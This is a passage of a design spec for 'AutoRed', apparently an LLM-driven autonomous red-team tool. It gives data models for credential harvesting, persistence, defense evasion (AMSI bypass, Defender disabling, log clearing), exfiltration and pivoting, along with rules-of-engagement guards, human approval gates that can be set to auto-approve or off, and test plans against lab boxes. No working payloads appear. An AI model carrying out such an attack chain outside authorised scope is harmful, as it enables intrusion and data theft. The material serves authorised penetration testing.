    evidence_paths: list[str] = Field(default_factory=list)
    lessons: list[str] = Field(default_factory=list)
    iteration_count: int = 0
    errors: list["ErrorEvent"] = Field(default_factory=list)
    summary: str = ""  # one-line outcome, set at end
```

### 9.2 All Sub-Models (Complete Definitions)

```python
class RulesOfEngagement(BaseModel):
    engagement_name: str
    operator: str
    operator_signature: str
    allowed_ips: list[str]
    allowed_techniques: list[str]
    persistence_allowed: bool
    evasion_allowed: bool
    exfiltration_allowed: bool
    data_destruction_allowed: bool
    kernel_exploits_allowed: bool
    hitl_mode: Literal["always_ask", "auto_approve", "disabled"]

class Host(BaseModel):
    ip: str
    hostname: str | None = None
    os_guess: str | None = None
    mac: str | None = None
    discovered_at: datetime
    discovered_by: str  # tool name

class NmapPortInfo(BaseModel):
    port: int
    protocol: Literal["tcp", "udp"]
    service: str | None
    product: str | None
    version: str | None

class Service(BaseModel):
    host_ip: str
    port: int
    protocol: Literal["tcp", "udp"]
    service: str | None
    product: str | None
    version: str | None
    banner: str | None = None
    discovered_at: datetime

class WebApp(BaseModel):
    url: str
    host_ip: str
    port: int
    status_code: int
    title: str | None
    tech_stack: list[str]
    web_server: str | None
    redirects: bool
    final_url: str | None

class DiscoveredPath(BaseModel):
    url: str
    status_code: int
    content_length: int
    depth: int
    discovered_at: datetime

class Vulnerability(BaseModel):
    id: str
    host_ip: str
    port: int | None
    service: str | None
    cve: str | None
    severity: Literal["critical", "high", "medium", "low", "info"]
    title: str
    description: str
    references: list[str]
    cvss_score: float | None
    source: Literal["nuclei", "nvd", "searchsploit", "manual"]
    evidence_path: str | None
    discovered_at: datetime

class AttackHypothesis(BaseModel):
    rank: int
    target: str
    technique: str
    cve: str | None
    expected_outcome: str
    tool: Literal["sqlmap", "hydra", "metasploit", "impacket", "custom"]
    tool_module: str | None       # e.g., "exploit/windows/smb/ms17_010_eternalblue"
    confidence: float             # 0.0 to 1.0
    rationale: str
    prerequisites: list[str]
    risks: list[str]
    command_preview: str | None   # proposed command (not executed yet)

class Foothold(BaseModel):
    id: str
    host_ip: str
    username: str
    context: Literal["user", "root", "system", "service_account"]
    method: str                   # "ms17_010", "sqli", "ssh_brute", etc.
    access_type: Literal["shell", "webshell", "rpc", "ssh", "winrm"]
    evidence_path: str
    established_at: datetime
    hypothesis_rank: int          # which hypothesis worked

class Credential(BaseModel):
    id: str
    username: str
    cred_type: Literal["password", "ntlm_hash", "kerberos_ticket", "ssh_key", "token", "other"]
    cred_value: str               # hashed/encrypted, never plaintext
    source: str                   # "mimikatz", "sam_dump", "brute_force"
    target_host: str | None
    cracked: bool = False
    cracked_value: str | None     # plaintext if cracked

class User(BaseModel):
    host_ip: str
    username: str
    uid: str | None               # Linux UID or Windows SID
    groups: list[str]
    is_admin: bool
    is_service_account: bool = False

class Secret(BaseModel):
    id: str
    host_ip: str
    secret_type: Literal["password", "hash", "key", "token", "config", "other"]
    secret_value: str
    source: str                   # file path, registry key, etc.
    discovered_at: datetime

class Trust(BaseModel):
    host_ip: str
    trust_type: Literal["ad_domain", "ssh_trust", "nfs_export", "smb_share", "kerberos"]
    target: str                   # domain, host, share
    details: dict

class PrivescCandidate(BaseModel):
    host_ip: str
    technique: str
    category: Literal["misconfig", "app_system", "kernel"]
    details: str
    confidence: float
    exploit_command: str
    removal_command: str | None   # how to undo if needed

class PrivescAttempt(BaseModel):
    candidate_id: str
    host_ip: str
    attempted_at: datetime
    success: bool
    error: str | None
    new_context: str | None       # "root", "system", etc.

class PersistenceArtifact(BaseModel):
    id: str
    host_ip: str
    method: Literal["cron", "systemd", "bashrc", "ssh_authorized_keys",
                    "scheduled_task", "registry_run", "service", "wmi_subscription", "dll_hijack"]
    details: dict                 # method-specific
    removal_command: str          # exact command to remove
    created_at: datetime
    foothold_id: str

class EvasionAction(BaseModel):
    id: str
    host_ip: str
    technique: Literal["amsi_bypass", "etw_patch", "log_clear", "defender_disable", "process_injection"]
    target: str                   # what was evaded
    success: bool
    command: str
    timestamp: datetime

class ExfilEvidence(BaseModel):
    id: str
    method: Literal["https", "dns", "icmp", "smb"]
    source_host: str
    data_size_bytes: int
    catch_server: str
    catch_server_log_path: str
    timestamp: datetime

class MovementPath(BaseModel):
    from_host: str
    to_host: str
    method: str
    credential_used: str          # credential ID
    timestamp: datetime

class PivotRecord(BaseModel):
    id: str
    target_host: str
    method: Literal["wmiexec", "psexec", "smbexec", "ssh", "winrm", "certipy", "crackmapexec"]
    credentials_used: list[str]   # credential IDs
    success: bool
    new_foothold_id: str | None
    timestamp: datetime
    needs_tunnel: bool

class TunnelConfig(BaseModel):
    id: str
    tool: Literal["chisel", "ligolo", "proxychains", "sshuttle"]
    proxy_endpoint: str
    local_port: int
    target_network: str           # CIDR reachable through tunnel
    established_at: datetime

class SubEngagementRef(BaseModel):
    sub_id: str
    target_host: str
    pivot_method: str
    status: Literal["running", "completed", "failed"]
    summary: str
    sub_state_path: str

class CleanupResult(BaseModel):
    artifact_id: str
    host_ip: str
    removal_command: str
    success: bool
    verified: bool                # re-scanned and confirmed gone
    error: str | None
    timestamp: datetime

class ErrorEvent(BaseModel):
    timestamp: datetime
    agent: str
    category: Literal["tool", "llm", "hallucination", "hitl", "state", "roe"]
    message: str
    context: dict
    recovered: bool
```

---

## 10. Error Handling

### 10.1 Five Error Categories

| Category | Example | Handling |
|---|---|---|
| **Tool execution failure** | nmap returns non-zero, subprocess times out | Retry once with backoff. If still fails, log to `errors[]`, continue to next planned step. |
| **LLM call failure** | API timeout, 429, 500 | Retry with exponential backoff (3 attempts: 2s, 4s, 8s). If still fails, exit current agent with error state. |
| **LLM hallucination** | Model invents fake nmap flag, fake CVE | Pydantic schema validation catches at tool-call boundary. Reject, re-prompt with "that flag doesn't exist, try again." Max 3 re-prompts. |
| **HitL rejection** | Operator says "no" at gate | Agent discards current hypothesis, tries next. If no more, exits with status. |
| **State corruption** | Pydantic validation fails on state transition | Hard stop. Save to `engagements/<id>/corrupted_state.json`. Surface to operator. |

### 10.2 Retry Decorator

```python
# autored/retry.py
import asyncio
from functools import wraps

def with_retry(max_attempts: int = 3, base_delay: float = 2.0):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return await func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
                    delay = base_delay * (2 ** attempt)
                    log.warning(f"Attempt {attempt+1} failed: {e}. Retrying in {delay}s")
                    await asyncio.sleep(delay)
        return wrapper
    return decorator
```

---

## 11. Logging & Audit

### 11.1 structlog Configuration

```python
# autored/logging.py
import structlog
import logging
import sys
from pathlib import Path
from datetime import datetime

def setup_logging(log_dir: str = "logs"):
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_file = Path(log_dir) / f"{datetime.utcnow().strftime('%Y-%m-%d')}.jsonl"

    timestamper = structlog.processors.TimeStamper(fmt="iso")
    structlog.configure(
        processors=[
            structlog.stdlib.add_log_level,
            timestamper,
            structlog.processors.StackInfoRenderer(),
            structlog.processors.format_exc_info,
            structlog.processors.JSONRenderer(),
        ],
        wrapper_class=structlog.stdlib.BoundLogger,
        logger_factory=structlog.PrintLoggerFactory(file=sys.stderr),
        cache_logger_on_first_use=True,
    )

    # Also write to file
    file_handler = logging.FileHandler(log_file)
    file_handler.setFormatter(logging.Formatter('%(message)s'))
    root_logger = logging.getLogger()
    root_logger.addHandler(file_handler)
    root_logger.setLevel(logging.INFO)

def get_logger(name: str):
    return structlog.get_logger(name)
```

### 11.2 Log Streams

**Operational log** (`logs/YYYY-MM-DD.jsonl`):
- Every tool call: `{ts, agent, tool, target, duration, status}`
- Every LLM call: `{ts, agent, model, prompt_tokens, completion_tokens, latency, status}`
- Every state transition: `{ts, from_phase, to_phase, state_diff_summary}`
- Every HitL gate: `{ts, agent, hypothesis, operator_response, duration}`
- Every error: full `ErrorEvent`

**Audit log** (`engagements/<id>/audit.jsonl`):
- Every action that affected the target: `{ts, tool, target, command, operator_approval, roe_decision}`

### 11.3 Log Retention

- Operational logs: rotated weekly, retained 90 days
- Audit logs: retained forever (per engagement)
- LLM prompt/response logs: retained 30 days (privacy)

---

## 12. Testing Strategy

### 12.1 Three Test Layers

**Unit tests** (~70% of test code)
- Every tool wrapper: test against fixture raw outputs (real nmap XML, real nuclei JSONL)
- Every Pydantic model: round-trip serialization tests
- Every model router decision: mocked LLM responses
- Every RoE Guard decision: mock actions
- Target: 90%+ coverage on tools, models, router, guard

**Integration tests** (~25%)
- LangGraph state transitions: feed mock state, verify correct agent fires next
- HitL gates: mock operator input, verify agent behavior
- Sub-graph spawning: mock pivot, verify sub-engagement runs
- Use recorded LLM responses (not live API calls) — replay testing

**End-to-end tests** (~5%)
- Run against HackTheBox easy boxes (Lame, Shocker, Blue)
- One test per phase
- Run nightly
- **Never run e2e tests against client boxes**

### 12.2 Test Fixture Example

```python
# tests/fixtures/nmap_lame_quick.xml
<?xml version="1.0"?>
<nmaprun scanner="nmap" args="nmap -oX - -T4 -F --top-ports 100 10.10.10.5" start="1695300000">
  <host>
    <status state="up" reason="echo-reply"/>
    <address addr="10.10.10.5" addrtype="ipv4"/>
    <address addr="00:50:56:b9:5c:8c" addrtype="mac"/>
    <hostnames><hostname name="lame.htb" type="user"/></hostnames>
    <ports>
      <port protocol="tcp" portid="21"><state state="open"/><service name="ftp" product="vsftpd" version="2.3.4"/></port>
      <port protocol="tcp" portid="22"><state state="open"/><service name="ssh" product="OpenSSH" version="4.7p1"/></port>
      <port protocol="tcp" portid="139"><state state="open"/><service name="netbios-ssn"/></port>
      <port protocol="tcp" portid="445"><state state="open"/><service name="smb"/></port>
      <port protocol="tcp" portid="3632"><state state="open"/><service name="distccd"/></port>
    </ports>
  </host>
</nmaprun>
```

```python
# tests/unit/tools/test_nmap.py
import pytest
from pathlib import Path
from autored.tools.nmap import _parse_nmap_xml

@pytest.fixture
def lame_xml():
    return Path("tests/fixtures/nmap_lame_quick.xml").read_text()

def test_parse_lame_xml(lame_xml):
    hosts = _parse_nmap_xml(lame_xml)
    assert len(hosts) == 1
    assert hosts[0].ip == "10.10.10.5"
    assert hosts[0].hostname == "lame.htb"
    assert len(hosts[0].ports) == 5

    ftp = next(p for p in hosts[0].ports if p.port == 21)
    assert ftp.service == "ftp"
    assert ftp.product == "vsftpd"
    assert ftp.version == "2.3.4"
```

### 12.3 Mock LLM Responses

```python
# tests/fixtures/llm_responses/recon_plan_lame.json
{
  "steps": [
    {"subagent": "portscan", "args": {"target": "10.10.10.5", "scan_type": "service"}, "depends_on": []},
    {"subagent": "webenum", "args": {"url": "http://10.10.10.5"}, "depends_on": [0]},
    {"subagent": "dnsenum", "args": {"hostname": "lame.htb"}, "depends_on": []}
  ]
}
```

```python
# tests/integration/test_recon_agent.py
@pytest.mark.asyncio
async def test_recon_agent_lame(mock_llm, mock_tools):
    """Recon Agent should plan and execute recon against HTB Lame."""
    mock_llm.set_response("plan_recon", load_fixture("recon_plan_lame.json"))
    mock_tools.set_output("nmap_scan", load_fixture("nmap_lame_quick.xml"))

    state = EngagementState(
        target_scope=["10.10.10.5"],
        operator="test",
        rules_of_engagement=sandbox_roe(),
    )

    result = await recon_node(state)

    assert len(result["hosts"]) == 1
    assert result["hosts"][0].ip == "10.10.10.5"
    assert len(result["services"]) >= 5
    assert result["phase"] == "vuln"
```

---

## 13. Phase Boundaries & Ship Criteria

### 13.1 Phase 1 — Core Framework + Recon Agent

**Ships:**
- Project scaffolding (pyproject.toml, uv, git, CI via GitHub Actions)
- LangGraph orchestrator with `EngagementState` schema
- Model router (Sonnet 4.5 default, DeepSeek fallback)
- RoE Guard with sandbox config
- 5 Recon sub-agents (PortScan, WebEnum, SubdomainEnum, DNSEnum, VhostEnum)
- 9 Phase 1 tool wrappers (nmap, httpx, nuclei, feroxbuster, subfinder, amass, dnsx, gobuster-vhost, naabu)
- CLI: `autored run --target X --roe Y --no-tui`, `autored resume <id>` (headless only — TUI ships in Phase 3)
- Engagement persistence (folder + SQLite checkpointer)
- structlog JSON logging
- Unit + integration tests

**Ship criteria:**
- [ ] `autored run --target 10.10.10.5 --roe roe-sandbox.yaml --no-tui` produces a structured recon report (headless mode)
- [ ] All unit tests pass (90%+ coverage on tools/models/router/guard)
- [ ] Integration tests pass against mock LangGraph state
- [ ] E2E test passes against HTB Lame
- [ ] Recon completes in under 10 minutes
- [ ] Raw outputs saved to `engagements/<id>/raw/`
- [ ] State checkpointed to `engagements/<id>/state.db`
- [ ] `autored resume <id>` works after Ctrl-C

### 13.2 Phase 2 — Vuln Agent + Self-Critique

**Ships:**
- Vuln Agent with self-critique loop (Sonnet → DeepSeek → Sonnet → DeepSeek)
- 3 sub-agents (CVEMatcher, ExploitFinder, HypothesisCritic)
- NVD/ExploitDB query tools
- Cross-engagement memory integration (Chroma + SQLite)

**Ship criteria:**
- [ ] Vuln Agent consumes Phase 1 recon output, produces 3-5 ranked hypotheses
- [ ] Self-critique loop runs (verifiable in logs)
- [ ] E2E test passes against HTB Shocker (vuln identifies Shellshock)
- [ ] 90%+ coverage on new code

### 13.3 Phase 3 — Exploit Agent + HitL Gates

**Ships:**
- Exploit Agent with HitL gates (TUI modal — see §17.4)
- Basic TUI: DashboardScreen + HitLGateModal + PhaseIndicator + AgentStatusPanel + ActivityLog (see §17.4)
- EventBus for orchestrator↔TUI communication (see §17.7, §17.8)
- 4 sub-agents (SQLiAgent, BruteAgent, MSFAgent, CustomAgent)
- sqlmap, hydra, medusa, metasploit-rpc tool wrappers
- Evidence capture (screenshots, command output)

**Ship criteria:**
- [ ] Full chain: recon → vuln → exploit → foothold
- [ ] E2E test passes against HTB Blue (EternalBlue via MSF)
- [ ] HitL gates fire correctly (verifiable in audit log)
- [ ] Evidence folder populated with exploitable artifacts
- [ ] `autored run --tui --target X --roe Y` launches dashboard
- [ ] DashboardScreen shows real-time agent status, phase indicator, activity log
- [ ] HitLGateModal appears when agent pauses for approval
- [ ] Keybindings `y`/`n`/`e`/`s` work correctly
- [ ] TUI tests pass with `textual.testing` (see §17.11)

### 13.4 Phase 4 — Post-Ex Agent (Six Sub-Activities)

**Ships:**
- Post-Ex Agent with all 6 sub-activities
- 7 sub-agents (LinuxEnum, WindowsEnum, PrivescFinder, CredHarvester, PersistenceAgent, EvasionAgent, ExfilAgent)
- BloodHound integration (Neo4j docker-compose)
- All Phase 4 tool wrappers

**Ship criteria:**
- [ ] E2E test passes against GoAD lab: foothold → privesc → persistence → cred harvest
- [ ] All 6 sub-activities produce structured state output
- [ ] RoE Guard correctly blocks disallowed activities (verifiable in tests)
- [ ] Cleanup of test artifacts confirmed

### 13.5 Phase 5 — Lateral + Cleanup

**Ships:**
- Lateral Agent with sub-graph recursion
- 2 sub-agents (PivotExecutor, TunnelSetup)
- Cleanup Agent with 2 sub-agents (ArtifactRemover, VerificationScanner)
- All Phase 5 tool wrappers (impacket, netexec, ligolo, etc.)

**Ship criteria:**
- [ ] E2E test passes against GoAD lab: full chain across 2+ hosts
- [ ] Sub-engagement state correctly linked to parent
- [ ] Cleanup Agent successfully removes all artifacts (verifiable via re-scan)
- [ ] No artifacts remain after cleanup

### 13.6 Phase 6 — Report + Full TUI Screens + Polish

**Ships:**
- Report Agent with 4 sub-agents (ExecSummaryWriter, TechReportWriter, MITREMapper, LessonExtractor)
- Full TUI screens (basic TUI shipped in Phase 3 — see §13.3): EngagementListScreen, EvidenceViewerScreen, StateInspectorScreen, FindingsTableScreen, LogViewerScreen, RoEEditorScreen, AttackGraphScreen
- PDF report generation (WeasyPrint)
- Cross-engagement memory fully wired (Chroma + SQLite on every engagement)
- Documentation, README, demo video

**Ship criteria:**
- [ ] Full kill chain runs end-to-end against GoAD lab without intervention (in sandbox mode)
- [ ] Report (markdown + PDF) generated for every engagement
- [ ] All Phase 6 TUI screens (§17.5) accessible via keybindings
- [ ] All phase ship criteria still pass (regression check)
- [ ] Documentation complete

---

## 14. CLI Reference

### 14.1 Commands

```bash
# Start a new engagement
autored run --target <ip|cidr|host> --roe <roe.yaml> [--name <engagement_name>] [--tui]

# Run engagement without TUI (Phase 1-2 default; outputs to terminal)
autored run --target 10.10.10.5 --roe roe-sandbox.yaml --no-tui

# Run engagement with TUI (Phase 3+ default; launches dashboard)
autored run --target 10.10.10.5 --roe roe-sandbox.yaml --tui

# Resume an interrupted engagement
autored resume <engagement_id>

# Generate report from completed engagement
autored report <engagement_id>

# List all engagements
autored engagements

# Show engagement state
autored state <engagement_id>

# Interactive RoE wizard
autored roe-wizard

# Validate a RoE file
autored roe-validate <roe.yaml>

# Run tests
autored test [--unit|--integration|--e2e]

# Show version
autored version
```

### 14.2 CLI Implementation

```python
# autored/cli.py
import typer
from rich.console import Console
from rich.table import Table
from pathlib import Path

app = typer.Typer(help="AutoRed — Autonomous Red Team Copilot")
console = Console()

@app.command()
def run(
    target: str = typer.Option(..., "--target", "-t", help="Target IP, CIDR, or hostname"),
    roe: str = typer.Option(..., "--roe", "-r", help="Path to RoE YAML file"),
    name: str = typer.Option("", "--name", "-n", help="Engagement name"),
    tui: bool = typer.Option(True, "--tui/--no-tui", help="Launch TUI dashboard (default: on for Phase 3+)"),
):
    """Start a new engagement.

    By default, launches the TUI dashboard (Phase 3+). Use --no-tui for
    headless / CLI-only operation (useful for CI, scripting, or Phase 1-2).
    """
    from autored.graph import build_phase1_graph
    from autored.state import EngagementState, RulesOfEngagement
    from autored.config import load_roe
    import yaml

    roe_config = load_roe(roe)
    engagement_id = _generate_engagement_id(target, name)

    if tui:
        # Launch TUI app (Phase 3+)
        from autored.tui.app import AutoRedApp
        app_tui = AutoRedApp(engagement_id=engagement_id)
        # Orchestrator runs in background thread/task
        # TUI shows dashboard, blocks on HitL gates
        app_tui.run()
    else:
        # Headless CLI mode (Phase 1-2 default)
        console.print(f"[bold green]Starting engagement (headless):[/] {engagement_id}")
        console.print(f"  Target: {target}")
        console.print(f"  RoE: {roe}")
        console.print(f"  Operator: {roe_config.operator}")

        # Initialize state
        state = EngagementState(
            engagement_id=engagement_id,
            target_scope=[target],
            operator=roe_config.operator,
            rules_of_engagement=roe_config,
        )

        # Build and run graph (headless)
        graph = build_phase1_graph(checkpointer=_make_checkpointer(engagement_id))
        final_state = graph.ainvoke(state)

        console.print(f"[bold green]Engagement complete:[/] {engagement_id}")
        console.print(f"  Phase: {final_state['phase']}")
        console.print(f"  Hosts found: {len(final_state.get('hosts', []))}")

@app.command()
def resume(engagement_id: str):
    """Resume an interrupted engagement."""
    console.print(f"[bold yellow]Resuming engagement:[/] {engagement_id}")
    # ... implementation

@app.command()
def report(engagement_id: str):
    """Generate report from completed engagement."""
    console.print(f"[bold blue]Generating report:[/] {engagement_id}")
    # ... implementation

@app.command()
def engagements():
    """List all engagements."""
    table = Table(title="Engagements")
    table.add_column("ID")
    table.add_column("Target")
    table.add_column("Phase")
    table.add_column("Started")
    # ... list from db/engagements.sqlite

@app.command()
def roe_wizard():
    """Interactive RoE file generator."""
    # ... interactive prompts

if __name__ == "__main__":
    app()
```

---

## 15. Configuration Reference

### 15.1 Environment Variables (`.env`)

```bash
# LLM API keys
ANTHROPIC_API_KEY=sk-ant-...
DEEPSEEK_API_KEY=sk-...

# Optional: DeepSeek base URL (for self-hosted)
DEEPSEEK_BASE_URL=https://api.deepseek.com/v1

# Optional: Neo4j credentials (Phase 4+)
NEO4J_URI=bolt://localhost:7687
NEO4J_USER=neo4j
NEO4J_PASSWORD=autored_local_dev

# Catch server for exfiltration tests (Phase 4+)
CATCH_SERVER_URL=http://localhost:8888

# Log level
LOG_LEVEL=INFO  # DEBUG, INFO, WARNING, ERROR
```

### 15.2 RoE YAML Schema

```yaml
# Required fields
engagement_name: string
operator: string
operator_signature: string
allowed_ips: list[string]    # IPs, CIDRs, or ["*"] for any
allowed_techniques: list[string]  # MITRE ATT&CK IDs or ["*"] for any

# Activity permissions (boolean)
persistence_allowed: bool
evasion_allowed: bool
exfiltration_allowed: bool
data_destruction_allowed: bool  # almost always false
kernel_exploits_allowed: bool

# HitL mode
hitl_mode: "always_ask" | "auto_approve" | "disabled"
```

### 15.3 Config File (`autored.config.yaml`)

```yaml
# autored.config.yaml — global config (not per-engagement)
log_dir: "logs"
engagements_dir: "engagements"
db_path: "db/engagements.sqlite"
chroma_path: "db/chroma"

# Default RoE for sandbox mode
default_sandbox_roe: "roe-sandbox.yaml"

# LLM settings
llm:
  default_temperature: 0.2
  default_max_tokens: 8192
  default_timeout: 120

# Tool defaults
tools:
  nmap_timeout: 600
  nuclei_timeout: 900
  feroxbuster_timeout: 600
  default_wordlist: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
  subdomain_wordlist: "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"

# Sub-agent defaults
subagents:
  max_execution_time: 300  # 5 min
  max_retries: 3
```

---

## 16. Project Structure

```
autored/
├── pyproject.toml
├── README.md
├── roe-sandbox.yaml
├── autored.config.yaml
├── .env.example
├── docker-compose.neo4j.yml        # Phase 4+
├── autored/
│   ├── __init__.py
│   ├── cli.py                       # Typer entry point
│   ├── config.py                    # load RoE YAML, env vars, global config
│   ├── graph.py                     # LangGraph orchestrator (phase1 + full)
│   ├── state.py                     # EngagementState + all Pydantic models
│   ├── router.py                    # model routing table + get_model()
│   ├── roe_guard.py                 # @roe_guard decorator + checks
│   ├── retry.py                     # @with_retry decorator
│   ├── logging.py                   # structlog setup
│   ├── models/                      # Pydantic model files (one per type)
│   │   ├── __init__.py
│   │   ├── host.py
│   │   ├── service.py
│   │   ├── webapp.py
│   │   ├── vulnerability.py
│   │   ├── hypothesis.py
│   │   ├── foothold.py
│   │   ├── credential.py
│   │   ├── user.py
│   │   ├── secret.py
│   │   ├── trust.py
│   │   ├── privesc.py
│   │   ├── persistence.py
│   │   ├── evasion.py
│   │   ├── exfil.py
│   │   ├── pivot.py
│   │   ├── tunnel.py
│   │   ├── cleanup.py
│   │   ├── subengagement.py
│   │   └── error.py
│   ├── agents/                      # primary agents
│   │   ├── __init__.py
│   │   ├── recon.py
│   │   ├── vuln.py
│   │   ├── exploit.py
│   │   ├── postex.py
│   │   ├── lateral.py
│   │   ├── cleanup.py
│   │   └── report.py
│   ├── subagents/                   # specialist sub-agents (27)
│   │   ├── __init__.py
│   │   ├── portscan.py
│   │   ├── webenum.py
│   │   ├── subdomainenum.py
│   │   ├── dnsenum.py
│   │   ├── vhostenum.py
│   │   ├── cvematcher.py
│   │   ├── exploitfinder.py
│   │   ├── hypothesiscritic.py
│   │   ├── sqliagent.py
│   │   ├── bruteagent.py
│   │   ├── msfagent.py
│   │   ├── customagent.py
│   │   ├── linuxenum.py
│   │   ├── windowsenum.py
│   │   ├── privescfinder.py
│   │   ├── credharvester.py
│   │   ├── persistenceagent.py
│   │   ├── evasionagent.py
│   │   ├── exfilagent.py
│   │   ├── pivotexecutor.py
│   │   ├── tunnelsetup.py
│   │   ├── artifactremover.py
│   │   ├── verificationscanner.py
│   │   ├── execsummarywriter.py
│   │   ├── techreportwriter.py
│   │   ├── mitremapper.py
│   │   └── lessonextractor.py
│   ├── tools/                       # tool wrappers
│   │   ├── __init__.py
│   │   ├── nmap.py
│   │   ├── naabu.py
│   │   ├── httpx.py
│   │   ├── nuclei.py
│   │   ├── feroxbuster.py
│   │   ├── subfinder.py
│   │   ├── amass.py
│   │   ├── dnsx.py
│   │   ├── gobuster_vhost.py
│   │   ├── nvd.py                   # Phase 2
│   │   ├── searchsploit.py          # Phase 2
│   │   ├── sqlmap.py                # Phase 3
│   │   ├── hydra.py                 # Phase 3
│   │   ├── metasploit.py            # Phase 3
│   │   ├── linpeas.py               # Phase 4
│   │   ├── winpeas.py               # Phase 4
│   │   ├── bloodhound.py            # Phase 4
│   │   ├── mimikatz.py              # Phase 4
│   │   ├── impacket_wmiexec.py      # Phase 5
│   │   ├── crackmapexec.py          # Phase 5
│   │   ├── ligolo.py                # Phase 5
│   │   └── ...
│   ├── persistence/                 # engagement storage
│   │   ├── __init__.py
│   │   ├── sqlite_saver.py
│   │   ├── chroma_store.py
│   │   ├── neo4j_store.py           # Phase 4+
│   │   └── filesystem.py            # engagement folder management
│   └── tui/                         # Textual TUI (Phase 3: dashboard + HitL modal; Phase 6: full screens)
│       ├── __init__.py
│       ├── app.py                   # AutoRedApp — main TUI entry
│       ├── event_bus.py             # EventBus (orchestrator↔TUI queue)
│       ├── app.tcss                 # global CSS
│       ├── screens/
│       │   ├── __init__.py
│       │   ├── dashboard.py         # Phase 3 — main engagement view
│       │   ├── hitl_gate.py         # Phase 3 — approval modal
│       │   ├── edit_command.py      # Phase 3 — inline command editor
│       │   ├── help.py              # Phase 3 — keybindings reference
│       │   ├── engagement_list.py   # Phase 6 — browse past engagements
│       │   ├── evidence_viewer.py   # Phase 6 — view captured evidence
│       │   ├── state_inspector.py   # Phase 6 — browse EngagementState tree
│       │   ├── findings_table.py    # Phase 6 — sortable findings
│       │   ├── attack_graph.py      # Phase 6 — pivot path visualization
│       │   ├── roe_editor.py        # Phase 6 — RoE YAML editor
│       │   └── log_viewer.py        # Phase 6 — real-time log tail
│       └── widgets/
│           ├── __init__.py
│           ├── phase_indicator.py   # kill-chain progress bar
│           ├── agent_status.py      # current agent panel
│           └── activity_log.py      # scrolling tool-call log
├── tests/
│   ├── unit/
│   │   ├── tools/
│   │   ├── models/
│   │   ├── router/
│   │   └── roe_guard/
│   ├── integration/
│   │   ├── agents/
│   │   └── graph/
│   ├── e2e/
│   │   ├── test_phase1_lame.py
│   │   ├── test_phase2_shocker.py
│   │   └── test_phase3_blue.py
│   └── fixtures/
│       ├── nmap_lame_quick.xml
│       ├── httpx_lame.json
│       ├── nuclei_lame.jsonl
│       └── llm_responses/
├── engagements/                     # per-engagement folders (runtime, gitignored)
├── db/                              # cross-engagement stores (runtime, gitignored)
├── logs/                            # daily JSONL logs (runtime, gitignored)
└── docs/
    └── superpowers/
        ├── specs/
        │   └── 2026-09-21-autored-design.md  # this file
        └── plans/
            ├── 2026-09-21-autored-phase1-core-recon.md
            ├── 2026-09-21-autored-phase2-vuln.md
            └── ...
```

---

## 17. TUI Specification (Textual)

### 17.1 TUI Ships in Two Phases

| Phase | What Ships | Why |
|---|---|---|
| **Phase 3** | Basic TUI: engagement dashboard + HitL gate modal | Phase 3 is when HitL gates first appear. CLI prompts (`[y/n/e/s]`) for gates are unusable when the proposed command is 200 characters. TUI is mandatory from Phase 3. |
| **Phase 6** | Full TUI: evidence viewer, state inspector, multi-engagement manager, RoE editor, real-time agent monitoring | Polish phase. Adds everything else. |

### 17.2 TUI Architecture

The TUI is a separate process from the LangGraph orchestrator. They communicate via:
1. **AsyncIO queue** (in-process, when TUI launches the engagement)
2. **SQLite polling** (cross-process, for `autored resume`)

```
┌──────────────────────────────────────────────────────────┐
│                  TUI Process (Textual)                    │
│                                                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │ Dashboard   │  │ HitL Modal  │  │ Evidence Viewer │  │
│  │ Screen      │  │ (pops over) │  │ Screen          │  │
│  └─────┬───────┘  └──────┬──────┘  └─────────┬───────┘  │
│        │                 │                   │          │
│        └────────────────┬┴───────────────────┘          │
│                         ▼                                │
│              ┌──────────────────────┐                    │
│              │  Event Bus           │                    │
│              │  (asyncio.Queue)     │                    │
│              └──────────┬───────────┘                    │
└─────────────────────────┼────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────┐
│              Orchestrator Process (LangGraph)            │
│                                                          │
│   Recon → Vuln → Exploit (HitL pause) → Post-Ex → ...   │
│                         │                                │
│                         ▼                                │
│              ┌──────────────────────┐                    │
│              │  HitL Gate Emit      │                    │
│              │  → event to queue    │                    │
│              │  → await response    │                    │
│              └──────────────────────┘                    │
└──────────────────────────────────────────────────────────┘
```

### 17.3 All Screens (Phase 3 + Phase 6)

| Screen | Purpose | Phase |
|---|---|---|
| **DashboardScreen** | Main engagement view: current phase, active agent, progress, recent activity | 3 |
| **HitLGateModal** | Modal overlay when agent pauses for approval | 3 |
| **EngagementListScreen** | Browse/resume past engagements | 6 |
| **AgentDetailScreen** | Drill into one agent's state, see its plan + tool calls | 6 |
| **EvidenceViewerScreen** | View screenshots, shell session captures, command output | 6 |
| **StateInspectorScreen** | Browse full `EngagementState` tree (collapsible) | 6 |
| **FindingsTableScreen** | Sortable/filterable table of all findings | 6 |
| **AttackGraphScreen** | Graph view of pivot paths (uses Rich rendering, not Neo4j UI) | 6 |
| **RoEEditorScreen** | View/edit RoE YAML with validation | 6 |
| **LogViewerScreen** | Tail the operational log in real-time | 6 |
| **HelpScreen** | Keybindings, command reference | 3 |

### 17.4 Phase 3 TUI — Concrete Implementation

#### App Class

```python
# autored/tui/app.py
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container
from textual.widgets import Header, Footer
from autored.tui.screens.dashboard import DashboardScreen
from autored.tui.screens.help import HelpScreen

class AutoRedApp(App):
    """AutoRed TUI — red team copilot interface."""

    CSS_PATH = "app.tcss"
    TITLE = "AutoRed"
    SUB_TITLE = "Red Team Copilot"

    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("d", "push_screen('dashboard')", "Dashboard", show=True),
        Binding("h", "push_screen('help')", "Help", show=True),
        Binding("e", "push_screen('engagements')", "Engagements", show=True),
        Binding("l", "push_screen('logs')", "Logs", show=True),
        Binding("?", "push_screen('help')", "Help", show=False),
    ]

    SCREENS = {
        "dashboard": DashboardScreen,
        "help": HelpScreen,
        # Phase 6 additions:
        # "engagements": EngagementListScreen,
        # "logs": LogViewerScreen,
    }

    def __init__(self, engagement_id: str | None = None):
        super().__init__()
        self.engagement_id = engagement_id
        self.event_queue = asyncio.Queue()  # orchestrator → TUI events

